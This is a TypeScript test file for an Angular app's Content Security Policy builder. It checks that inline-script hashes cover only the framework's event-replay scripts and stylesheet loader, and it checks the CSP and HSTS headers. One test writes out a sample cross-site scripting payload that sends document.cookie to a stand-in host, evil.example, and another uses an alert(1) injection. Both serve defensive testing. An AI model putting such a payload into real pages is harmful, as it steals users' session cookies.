import { STYLESHEET_ONLOAD, baseSecurityHeaders, inlineScriptSources, originOf, pageCsp } from './csp';

async function sha(text: string): Promise<string> {
  const digest = new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(text)));
  return `'sha256-${btoa(String.fromCharCode(...digest))}'`;
}

const CONTRACT = '(()=>{function p(t){return t}window.__jsaction_bootstrap=p})();';
const BOOTSTRAP = 'window.__jsaction_bootstrap(document.body,"ng",["click","keydown"],["error"]);';

function page(extra = ''): string {
  return `<!doctype html><html><head>
<link rel="stylesheet" href="styles.css" media="print" onload="${STYLESHEET_ONLOAD}">
<script type="text/javascript" id="ng-event-dispatch-contract">${CONTRACT}</script><script>${BOOTSTRAP}</script>
</head><body><app-root></app-root>
<script src="main.js" type="module"></script>
<script id="ng-state" type="application/json">{"a":1}</script>${extra}</body></html>`;
}

describe('page CSP', () => {
  it("allows Angular's event replay scripts and stylesheet loader by hash", async () => {
    const sources = await inlineScriptSources(page());
    expect(sources).toEqual([await sha(CONTRACT), await sha(BOOTSTRAP), "'unsafe-hashes'", await sha(STYLESHEET_ONLOAD)]);
  });

  it('gives no hash to any other inline script', async () => {
    const evil = 'fetch("https://evil.example/?c="+document.cookie)';
    const sources = await inlineScriptSources(page(`<script>${evil}</script><script>window.__jsaction_bootstrap(document.body,"ng",[],[]);${evil}</script>`));
    expect(sources).not.toContain(await sha(evil));
    expect(sources).toHaveLength(4);
  });

  it('accepts only the first event dispatch contract', async () => {
    const sources = await inlineScriptSources(page('<script id="ng-event-dispatch-contract">alert(1)</script>'));
    expect(sources).not.toContain(await sha('alert(1)'));
  });

  it('ignores external and JSON scripts, and needs nothing for a page without inline scripts', async () => {
    expect(await inlineScriptSources('<script src="a.js"></script><script type="application/json">{}</script>')).toEqual([]);
  });

  it('builds a policy without unsafe-inline scripts, framing or plugins', () => {
    const csp = pageCsp(["'sha256-abc'"], 'https://api.example.com');
    const directives = Object.fromEntries(csp.split('; ').map((d) => [d.split(' ')[0], d]));
    expect(directives['script-src']).toBe("script-src 'self' 'sha256-abc'");
    expect(directives['connect-src']).toBe("connect-src 'self' https://api.example.com");
    expect(directives['frame-ancestors']).toBe("frame-ancestors 'none'");
    expect(directives['object-src']).toBe("object-src 'none'");
    expect(directives['img-src']).toContain('https://*.steamstatic.com');
    expect(directives['font-src']).toContain('https://fonts.gstatic.com');
    expect(directives['style-src']).toContain('https://fonts.googleapis.com');
  });

  it('does not repeat the API origin when it is the same site', () => {
    expect(pageCsp([], "'self'")).toContain("connect-src 'self';");
    expect(pageCsp([], '')).toContain("connect-src 'self';");
  });

  it('takes the origin of the API URL', () => {
    expect(originOf('http://localhost:8080/api')).toBe('http://localhost:8080');
    expect(originOf('not a url')).toBe('');
  });

  it('sends HSTS only over HTTPS', () => {
    expect(baseSecurityHeaders(false)['Strict-Transport-Security']).toBeUndefined();
    expect(baseSecurityHeaders(true)['Strict-Transport-Security']).toBe('max-age=31536000');
    expect(baseSecurityHeaders(false)['X-Content-Type-Options']).toBe('nosniff');
  });
});
